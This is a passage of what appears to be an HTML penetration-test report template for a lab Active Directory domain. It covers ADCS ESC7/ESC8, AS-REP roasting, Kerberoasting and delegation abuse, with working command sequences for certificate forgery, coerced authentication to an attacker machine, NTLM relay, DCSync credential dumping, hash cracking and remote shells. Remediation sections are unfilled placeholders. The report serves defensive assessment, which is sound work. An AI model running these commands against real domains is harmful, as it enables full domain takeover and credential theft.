                                            <p>ESC7 is a vulnerability within ADCS where a low-privileged user has the
                                                ManageCA or Manage Certificate rights, which allow user to issue failed
                                                certificate requests such as exploit requests which have failed due to
                                                lacking permissions.</p>
                                            <p>TEST\test has ManageCA, ManageCertificates, Read, Enroll rights over
                                                test-CA-CA, giving TEST\test the ability to approve failed ESC1
                                                requests, thus allowing the user to exploit ESC1. TEST\test can request
                                                to enroll in the SubCA template (vulnerable to ESC1 by default). The
                                                request will be denied as only administraors can enroll in the template,
                                                however can simply issue the failed request using the manage permissions
                                                afterwards, facilitating successful ESC1.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link
                                                    1</a></p>
                                            <p><a href="https://www.tarlogic.com/blog/ad-cs-esc7-attack/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate domain
                                                        certificate authorities for low-privileged users with the
                                                        ManageCA or Manage Certificate rights using certipy.</p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p
                                                        'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC7-1.png" alt="Finding ESC7">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. The SubCA template is by default vulnerable to ESC1, but only
                                                        administrators can enroll in the template. If disabled, this
                                                        template can first be enabled on the CA.</p>
                                                    <p class="code">certipy ca -ca 'test-CA-CA' -target ca.test.local
                                                        -enable-template SubCA -u test@test.local -p 'Password123!'</p>

                                                    <p>A certificate based on the SubCA template can be requested with a
                                                        SAN of Administrator like in ESC1. This request will be denied,
                                                        but we will save the private key and note down the request ID.
                                                    </p>
                                                    <p class="code">certipy req -u test@test.local -p 'Password123!' -ca
                                                        test-CA-CA -target ca.test.local -template SubCA -upn
                                                        administrator@test.local</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC7-2.png"
                                                        alt="Exploiting ESC7">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. The failed certificate request can be issued with the ca
                                                        command and the -issue-request <request ID> parameter.</p>
                                                    <p class="code">certipy ca -ca 'test-CA-CA' -target ca.test.local
                                                        -issue-request 77 -u test@test.local -p 'Password123!'</p>

                                                    <p>The issued certificate can then be retrieved with the req
                                                        command.</p>
                                                    <p class="code">certipy req -u test@test.local -p 'Password123!' -ca
                                                        test-CA-CA -target ca.test.local -retrieve 77</p>

                                                    <p>The retrived certificate can then be used with PKINIT to
                                                        authenticate as the domain administrator and obtain their NTLM
                                                        hash, allowing full impersonation and domain privilege
                                                        escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip
                                                        192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC7-3.png"
                                                        alt="Exploiting ESC7">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>ESC7 remediation</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td class="toggle" id="ESC8"><u>ESC8</u></td>
                    <td class="finding-riskcritical">CRITICAL</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users can impersonate the identity of a domain controller via
                                            a 'NTLM relay' attack.</td>
                                        <td>T-15940</td>
                                        <td>+50</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo">
                                            <table>
                                                <tr>
                                                    <td class="grey">CA Name</td>
                                                    <td>test-CA-CA</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">CA Endpoint</td>
                                                    <td>http://CA.test.local/certsrv/</td>
                                                </tr>
                                                <tr>
                                                    <td class="grey">Relay Protections</td>
                                                    <td>False</td>
                                                </tr>
                                            </table>
                                        </td>
                                        <td class="explanation">
                                            <p>ESC8 is a vulnerability within ADCS where a certificate authority has the
                                                Web Enrollment service installed and is enabled via HTTP.
                                                The web enrollment interface (http://CA.test.local/certsrv/) is
                                                vulnerable to 'NTLM relay' attacks.
                                                Without necessary protections, the web services endpoint can by-default
                                                be exploited to issue arbitrary certificates in the context of the
                                                coerced authentication (i.e. of a domain controller) to any low
                                                privileged user.</p>
                                            <p>This allows a low-privileged user to escalate to a domain controller and
                                                extract all user passwords from the domain.</p>
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link
                                                    1</a></p>
                                            <p><a
                                                    href="https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-3/">Link
                                                    2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate domain
                                                        certificate authorities HTTP web services endpoints and see if
                                                        they are lacking relaying protections using certipy.
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p
                                                        'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC8-1.png" alt="Finding ESC8">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can by default coerce machine
                                                        authentication using RPC from the domain controller to an
                                                        attacker controlled machine
                                                        (192.168.10.130) with printerbug.py or dfscoerce.py.
                                                    </p>
                                                    <p class="code">python3 printerbug.py
                                                        test:'Password123'@192.168.10.141
                                                        192.168.10.130</p>
                                                    <p class="code">python3 dfscoerce.py -u test -p 'Password123!' -d
                                                        test.local
                                                        192.168.10.130 192.168.18.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC8-2.png"
                                                        alt="Coercing authentication">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. The coerced authentication is then relayed to an unsecured
                                                        certificate HTTP endpoint (e.g.
                                                        http://192.168.10.142/certsrv/certfnsh.asp)
                                                        to enroll in the default "DomainController" certificate template
                                                        under the context of the domain controller. This returns a pfx
                                                        certificate as the domain controller.
                                                    </p>

                                                    <p class="code">python3 entry.py relay -target
                                                        'http://192.168.10.141' -template
                                                        DomainController</p>
                                                    <p>This authentication certificate can be used to obtain the ntlm
                                                        hash for the domain controller.</p>
                                                    <p class="code">python3 entry.py auth -pfx 'dc.pfx' -dc-ip
                                                        192.168.10.141</p>
                                                    <p> The ntlm hash can then be used to replicate the behavior of a
                                                        domain
                                                        controller and obtain all the user password hashes within the
                                                        domain via a DCSync.</p>
                                                    <p class="code">impacket-secretsdump 'dc$'@192.168.10.141 -hashes
                                                        :xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC8-3.png"
                                                        alt="Relaying authentication to ADCS web endpoint">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Enforce HTTPS & EPA, disable Kerberos or disable the endpoint</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
            </tbody>
        </table>
    </div>



<!----------------------------------------->

<div class="finding-header">Kerberos</div>
<div class="finding-container">
<table>
    <thead>
        <tr>
            <th class="table-header">Issue</th>
            <th class="table-header">Risk</th>
        </tr>
    </thead>
    <tbody>                <tr>
            <td class="toggle" id="Highly-privileged-ASREP-roastable-user-with-a-weak-password"><u>Highly privileged ASREP-roastable user with a weak password</u></td>
            <td class="finding-riskCRITICAL">CRITICAL</td>
        </tr>
        <tr class="finding">
            <td colspan="3">
                <div class="finding-info">
                    <table>
                        <tbody>
                            <tr>
                                <th>Issue</th>
                                <th>MITRE ATT&CK ref</th>
                                <th>Score</th>
                            </tr>
                            <tr><td>Password hash of a highly privileged account can be obtained and cracked.</td>                                        <td>T-15940</td>
                                <td>+50</td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Relevant info</th>
                                <th>Issue explanation</th>
                            </tr>
                            <tr>
                                <td class="relevantinfo"><table>
                                    <tr><td class="grey">Users</td><td>jack<br>ASREPuser</td></tr>                    <tr><td class="grey">MemberOf</td><td>CN=Domain Admins,CN=Users,DC=test,DC=local CN=Enterprise Admins,CN=Users,DC=test,DC=local CN=Schema Admins,CN=Users,DC=test,DC=local.<br>CN=Server Operators,CN=Builtin,DC=test,DC=local.</td></tr>                                        <tr><td class="grey">Enabled</td><td>True</td></tr>
                                <tr><td class="grey">DoNotRequireKerberosPreauthentication</td><td>True</td></tr>
                                </table></td>
                                <td class="explanation">
                                    <p>ASREP-roasting is a vulnerability where a user has the "Do not requrire Kerberos preauthentication" flag set within Active Directory. This means that when requesting a TGT from the KDC, the entire validation process of needing to present a timestamp encrypted with the user’s hashed password to validate that user is authorized to request the TGT is skipped. Therefore without even knowing the users password, it is possible to retrieve an encrypted TGT for the user in an AS-REP message.</p>
                                    <p>This means for 2 users it is possible to retrieve the user's hashed password and attempt to crack it if the password is weak to obtain the user's plaintext password. Even if the password is strong, it is still theoretically possible for a determined threat actor with unlimited time and computational power to crack the hash, however the risk is lower.</p>
                                    <p class="links"><b>Further information:</b></p>
                                    <p><a href="https://trustmarque.com/resources/asreproasting/>">Link 1</a></p>
                                    <p><a href="https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/">Link 2</a></p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Attack explanation</th>
                            </tr>
                            <tr>
                                <td>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>1. Any low-privileged user can search for accounts that have the "Do not require Kerberos preauthentication" flag set within the directory.</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/ASREProast-1.png" alt="Finding ASREP-roastable accounts">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. Any low-privileged user can request an encrypted TGT for the user not requirng kerberos preauthenticaiton and obtain the password hash for the user.</p>
                                            <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' --asreproast output.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/ASREProast-2.png"
                                                alt="Obtaining the hash">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>3. If the password is weak the password hash can be cracked using a common wordlist to obtain the plaintext password, or is can be bruteforced using a powerful GPU.</p>
                                            <p class="code">john --wordlist=./password-list.txt hash.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/ASREProast-3.png"
                                                alt="Cracking the hash">
                                        </span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Remediation (GPT to contextualize)</th>
                            </tr>
                            <tr>
                                <td>
                                    <p>Remove the do not require pre auth flag for X,Y,Z users - there is no use case for this.</p>
                                    <p>run command 1</p>
                                    <p>run command 2</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </td>
        </tr>                <tr>
            <td class="toggle" id="Highly-privileged-Kerberoastable-user-with-a-weak-password"><u>Highly privileged Kerberoastable user with a weak password</u></td>
            <td class="finding-riskCRITICAL">CRITICAL</td>
        </tr>
        <tr class="finding">
            <td colspan="3">
                <div class="finding-info">
                    <table>
                        <tbody>
                            <tr>
                                <th>Issue</th>
                                <th>MITRE ATT&CK ref</th>
                                <th>Score</th>
                            </tr>
                            <tr><td>Password hash of a highly privileged account can be obtained and cracked.</td>                                        <td>T1558.003</td>
                                <td>+50</td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Relevant info</th>
                                <th>Issue explanation</th>
                            </tr>
                            <tr>
                                <td class="relevantinfo"><table>
                                    <tr><td class="grey">Users</td><td>Administrator<br>jack</td></tr>
                                    <tr><td class="grey">SPN</td><td>HOST/bob<br>HTTP/webserver</td></tr>                    <tr><td class="grey">MemberOf</td><td>CN=Group Policy Creator Owners,CN=Users,DC=test,DC=local CN=Domain Admins,CN=Users,DC=test,DC=local CN=Enterprise Admins,CN=Users,DC=test,DC=local CN=Schema Admins,CN=Users,DC=test,DC=local CN=Administrators,CN=Builtin,DC=test,DC=local.<br>CN=Domain Admins,CN=Users,DC=test,DC=local CN=Enterprise Admins,CN=Users,DC=test,DC=local CN=Schema Admins,CN=Users,DC=test,DC=local.</td></tr>                                        <tr><td class="grey">Enabled</td><td>True</td></tr>
                                </table></td>
                                <td class="explanation">
                                    <p>Kerberoasting is a vulnerability where an account has a Service Principal Name (SPN) set and a weak password within Active Directory. In Microsoft Windows, SPNs are simply unique identifiers of service accounts. By design, to access the service run by the account, domain users request tickets (TGS) for that service using Kerberos which are encrypted with the service account’s NTLM hash. This is possible by any domain user, regardless if they have permission to access the service or not. The TGS is encrypted with a hashed vesion of the account's password, which can be retrieved from the TGS.</p>
                                    <p>This means for 2 users with an SPN set, it is possible to retrieve the user's hashed password that can be cracked if the password is weak to obtain the user's plaintext password. Even if the password is strong, it is still theoretically possible for a determined threat actor with unlimited time and computational power to crack the hash, however the risk is lower.</p>
                                    <p class="links"><b>Further information:</b></p>
                                    <p><a href="https://attack.mitre.org/techniques/T1558/003/>">Link 1</a></p>
                                    <p><a href="https://www.netwrix.com/cracking_kerberos_tgs_tickets_using_kerberoasting.html">Link 2</a></p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Attack explanation</th>
                            </tr>
                            <tr>
                                <td>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>1. Any low-privileged user can search for accounts with an SPN set.</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/Kerberoasting-1.png" alt="Finding Kerberoastable accounts">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. Any low-privileged user can request a TGS for the service and extract the password hash from the TGS for the service account.</p>
                                            <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' --kerberoasting output.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/Kerberoasting-2.png"
                                                alt="Obtaining the hash">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>3. If the password is weak the password hash can be cracked using a common wordlist to obtain the plaintext password, or is can be bruteforced using a powerful GPU.</p>
                                            <p class="code">john --format=krb5tgs --wordlist=./password-list.txt hash.txt</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/Kerberoasting-3.png"
                                                alt="Cracking the hash">
                                        </span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Remediation (GPT to contextualize)</th>
                            </tr>
                            <tr>
                                <td>
                                    <p>Remove the SPN / move to low privileged account / gMSA.</p>
                                    <p>run command 1</p>
                                    <p>run command 2</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </td>
        </tr>                <tr>
            <td class="toggle" id="Unconstrained-delegation"><u>Unconstrained delegation</u></td>
            <td class="finding-riskHIGH">HIGH</td>
        </tr>
        <tr class="finding">
            <td colspan="3">
                <div class="finding-info">
                    <table>
                        <tbody>
                            <tr>
                                <th>Issue</th>
                                <th>MITRE ATT&CK ref</th>
                                <th>Score</th>
                            </tr>
                            <tr>
                                <td>A server that is set for unconstrained delegation can compromise the entire domain.</td>
                                <td>T1558.001</td>
                                <td>+30</td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Relevant info</th>
                                <th>Issue explanation</th>
                            </tr>
                            <tr>
                                <td class="relevantinfo"><table>
                                    <tr><td class="grey">Object</td><td>UNCONSTRAINED$</td></tr>
                                    <tr><td class="grey">TrustedForDelegation</td><td>True</td></tr>
                                </table></td>
                                <td class="explanation">
                                    <p>Servers with unconstrained delegation configured cache user's tickets when they authenticate to the frontend service, in order to delegate on behalf of the user to another backend service. This is dangerous if a high privleged user or a domain controller (a connection can be forced using the spooler service) then the domain can be compromised.</p>
                                    <p>If computers with unconstrained delegation are compromised, full domain compromise is achievable by coercing authentication from a domain controller, who's ticket will be then be cached and can be extracted on the computer facilitating impersonation of a domain controller.</p>
                                    <p class="links"><b>Further information:</b></p>
                                    <p><a href="https://blog.netwrix.com/2022/12/02/unconstrained-delegation/">Link 1</a></p>
                                    <p><a href="https://pentestlab.blog/2022/03/21/unconstrained-delegation/">Link 2</a></p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Attack explanation</th>
                            </tr>
                            <tr>
                                <td>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>1. Any low-privileged user can find which servers are configured for unconstrained delegation using netexec. Domain controllers are configured for unconstrained delegation by default and can be excluded.</p>
                                            <p class="code">nxc ldap dc.test.local -u test -p 'Password123' --trusted-for-delegation</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/unconstrained-1.png" alt="Finding unconstrained delegation">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. For the purpose of this attack it's assumed the server configured for unconstrained delegation has been compromised, and credential memory dumped.</p>
                                            <p class="code">impacket-secretsdump Administrator:'Password123!'@dc.test.local -just-dc-user 'unconstrained$'</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/unconstrained-2.png" alt="Compromise of unconstrained delegation server">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>3. With unconstrained$ already compromised, it can update its SPN to point to a service running on an attacker machine "attacker.test.local". This is doen so when a DC authenticates to the unconstrained$ service it will be tricked to send the ticket to the attacker machine.</p>
                                            <p class="code">python3 addspn.py -u test.local\\unconstrained\$ -p aad3b435b51404eeaad3b435b51404ee:f5775d6dd236b519c70bc28430f35b72 -s HOST/attacker.test.local dc.test.local --additional dc.test.local</p>
                                            <p>A DNS record can be added by any low-privileged account to the domain, so one is added to point the SPN to the IP of the attacker kali machine which will update every 180 seconds.</p>
                                            <p class="code">python3 dnstool.py -u test.local\\unconstrained\$ -p aad3b435b51404eeaad3b435b51404ee:f5775d6dd236b519c70bc28430f35b72 -r attacker.test.local -d 192.168.10.130 --action add dc.test.local</p>
                                            </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/unconstrained-3.png" alt="Adding SPN & dns record">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>4. Authentication can be coerced from the domain controller to the attacker machine using printerbug.</p>
                                            <p class="code">python3 printerbug.py test:'Password123!'@dc.test.local attacker.test.local</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/unconstrained-4.png" alt="Coercing authentication">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>5. A kerberos listener is started to collect, decrypt and save the cached TGS of the domain controller intercepted from the coerced authentication.</p>
                                            <p class="code">python3 krbrelayx.py -hashes aad3b435b51404eeaad3b435b51404ee:f5775d6dd236b519c70bc28430f35b72</p>

                                            <p>Finally, with the ticket of the domain controller obtained, a DCSync can be performed to extract all user credentials to fully compromise the domain.</p>
                                            <p class="code">export KRB5CCNAME=DC\$@TEST.LOCAL_krbtgt@TEST.LOCAL.ccache</p>
                                            <p class="code">impacket-secretsdump -k -no-pass dc.test.local</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/unconstrained-5.png" alt="Exploiting unconstrained">
                                        </span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Remediation (GPT to contextualize)</th>
                            </tr>
                            <tr>
                                <td>
                                    <p>Unconstrained remediation</p>
                                    <p>run command 1</p>
                                    <p>run command 2</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </td>
        </tr>                <tr>
            <td class="toggle" id="Constrained-delegation"><u>Constrained delegation</u></td>
            <td class="finding-riskHIGH">HIGH</td>
        </tr>
        <tr class="finding">
            <td colspan="3">
                <div class="finding-info">
                    <table>
                        <tbody>
                            <tr>
                                <th>Issue</th>
                                <th>MITRE ATT&CK ref</th>
                                <th>Score</th>
                            </tr>
                            <tr>
                                <td>A server has full control of another server by being allowed to delegate to it (msDS-AllowedToDelegateTo).</td>
                                <td>T1558.001</td>
                                <td>+30</td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Relevant info</th>
                                <th>Issue explanation</th>
                            </tr>
                            <tr>
                                <td class="relevantinfo"><table>
                                    <tr><td class="grey">Object</td><td>DESKTOP-JKTS35O$<br>CA$</td></tr>
                                    <tr><td class="grey">AllowedToDelegateTo</td><td>cifs/CA.test.local cifs/CA<br>ldap/DC.test.local/test.local ldap/DC.test.local ldap/DC</td></tr>
                                </table></td>
                                <td class="explanation">
                                    <p>Constrained delegation allows a computer to delegate to specific services on another server. Constrained delegation is configured on the computer or user object. It is set through the msds-allowedtodelegateto property by specifying the SPN the current object is allowed constrained delegation against.</p>
                                    <p>If computers with constrained delegation are compromised, full compromise of the server it has permission to delegate to is achievable by proxy.</p>
                                    <p>DESKTOP-JKTS35O$ has constrained delegation to cifs/CA.test.local cifs/CA. CA$ has constrained delegation to ldap/DC.test.local/test.local ldap/DC.test.local ldap/DC. </p>
                                    <p class="links"><b>Further information:</b></p>
                                    <p><a href="https://blog.netwrix.com/2023/04/21/attacking-constrained-delegation-to-elevate-access/">Link 1</a></p>
                                    <p><a href="https://www.guidepointsecurity.com/blog/delegating-like-a-boss-abusing-kerberos-delegation-in-active-directory/">Link 2</a></p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Attack explanation</th>
                            </tr>
                            <tr>
                                <td>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>1. Any low-privileged user can find which servers are configured for constrained delegation by searching for servers with the 'msDS-AllowedToDelegateTo' property populated.</p>
                                            <p class="code">impacket-findDelegation -target-domain test.local test.local/test:'Password123!'</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/constrained-1.png" alt="Finding constrained delegation">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. If the frontend service is compromised (DESKTOP-JKTS35O$), an adversary can request a ticket for any service on the backend (CA$).</p>
                                            <p class="code">impacket-getST -dc-ip dc.test.local -spn cifs/CA.test.local -impersonate administrator test.local/'DESKTOP-JKTS35O$' -hashes :511e061a15068d1cbda8dfc4cc22a2f3</p>
                                            <p>With a CIFS ticket obtained for the backend service, an adversary can remotely connect and obtain an administrator command prompt on the backend service..</p>
                                            <p class="code">export KRB5CCNAME=administrator.ccache</p>
                                            <p class="code">impacket-wmiexec -k -no-pass administrator@ca.test.local</p>
                                            </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/constrained-2.png" alt="exploiting constrained delegation">
                                        </span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Remediation (GPT to contextualize)</th>
                            </tr>
                            <tr>
                                <td>
                                    <p>Constrained remediation</p>
                                    <p>run command 1</p>
                                    <p>run command 2</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </td>
        </tr>                <tr>
            <td class="toggle" id="Resource-based-constrained-delegation"><u>Resource-based constrained delegation</u></td>
            <td class="finding-riskHIGH">HIGH</td>
        </tr>
        <tr class="finding">
            <td colspan="3">
                <div class="finding-info">
                    <table>
                        <tbody>
                            <tr>
                                <th>Issue</th>
                                <th>MITRE ATT&CK ref</th>
                                <th>Score</th>
                            </tr>
                            <tr>
                                <td>A server has full control of another server by being allowed to act on behalf of it (msDS-AllowedToActOnBehalfOfOtherIdentity).</td>
                                <td>T1558.001</td>
                                <td>+30</td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Relevant info</th>
                                <th>Issue explanation</th>
                            </tr>
                            <tr>
                                <td class="relevantinfo"><table>
                                    <tr><td class="grey">Object</td><td>DESKTOP-JKTS35O$<br>CA$</td></tr>
                                    <tr><td class="grey">msDS-AllowedToActOnBehalfOfOtherIdentity</td><td>S-1-5-21-1189352953-3643054019-2744120995-1561<br>TEST\RBCD$</td></tr>
                                </table></td>
                                <td class="explanation">
                                    <p>Resource-based constrained delelgation (RBCD) was introduced in Windows server 2012 and is where a server permits delegation from a frontend service to a backend service. This is configured on the backend service via the 'msDS-AllowedToActOnBehalfOfOtherIdentity' property. This type of delegation was seen as more secure than unconstrained or constrained, however if the frontend service is compromised, the backend service will also be by proxy.</p>
                                    <p>S-1-5-21-1189352953-3643054019-2744120995-1561 can delegate to any resource on DESKTOP-JKTS35O$ (has full admin access permitting lateral movement). TEST\RBCD$ can delegate to any resource on CA$ (has full admin access permitting lateral movement). </p>
                                    <p class="links"><b>Further information:</b></p>
                                    <p><a href="https://redfoxsec.com/blog/rbcd-resource-based-constrained-delegation-abuse/">Link 1</a></p>
                                    <p><a href="https://blog.netwrix.com/2022/09/29/resource-based-constrained-delegation-abuse/">Link 2</a></p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Attack explanation</th>
                            </tr>
                            <tr>
                                <td>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>1. Any low-privileged user can find which servers are configured for RBCD by searching for those with the msDS-AllowedToActOnBehalfOfOtherIdentity property populated.</p>
                                            <p class="code">Get-ADComputer 'CA' -Properties PrincipalsAllowedToDelegateToAccount</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/RBCD-1.png" alt="Finding RBCD">
                                        </span>
                                    </div>
                                    <hr>
                                    <div class="attack-container">
                                        <div class="attack-text">
                                            <p>2. If the frontend service is compromised (RBCD$), an adversary can request a ticket for any service on the backend (CA$).</p>
                                            <p class="code">impacket-getST -dc-ip dc.test.local -spn cifs/CA.test.local -impersonate administrator test.local/'RBCD$' -hashes :88d61b9ad3988a5bb86ca8ba9386d736</p>
                                            <p>With a CIFS ticket obtained for the backend service, an adversary can remotely connect and obtain an administrator command prompt on the backend service.</p>
                                            <p class="code">export KRB5CCNAME=administrator.ccache</p>
                                            <p class="code">impacket-wmiexec -k -no-pass administrator@ca.test.local</p>
                                        </div>
                                        <span class="image-cell">
                                            <img src="/Private/Report/Images/Kerberos/RBCD-2.png" alt="Exploiting RBCD">
                                        </span>
                                    </div>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Remediation (GPT to contextualize)</th>
                            </tr>
                            <tr>
                                <td>
                                    <p>RBCD remediation</p>
                                    <p>run command 1</p>
                                    <p>run command 2</p>
                                </td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </td>
        </tr>                <tr>
            <td class="toggle" id="Low-privileged-Kerberoastable-user-with-a-weak-password"><u>Low privileged Kerberoastable user with a weak password</u></td>
            <td class="finding-riskHIGH">HIGH</td>
        </tr>
        <tr class="finding">
            <td colspan="3">
                <div class="finding-info">
                    <table>
                        <tbody>
                            <tr>
                                <th>Issue</th>
                                <th>MITRE ATT&CK ref</th>
                                <th>Score</th>
                            </tr>
                            <tr><td>Password hash of a low privileged account can be obtained and cracked.</td>                                        <td>T1558.003</td>
                                <td>+25</td>
                            </tr>
                        </tbody>
                    </table>
                    <table>
                        <tbody>
                            <tr>
                                <th>Relevant info</th>
                                <th>Issue explanation</th>
                            </tr>
                            <tr>
                                <td class="relevantinfo"><table>
                                    <tr><td class="grey">Users</td><td>TERESA_MCFARLAND<br>bob</td></tr>
                                    <tr><td class="grey">SPN</td><td>http/test<br>test/HTTP</td></tr>                                        <tr><td class="grey">Enabled</td><td>True</td></tr>
                                </table></td>
                                <td class="explanation">
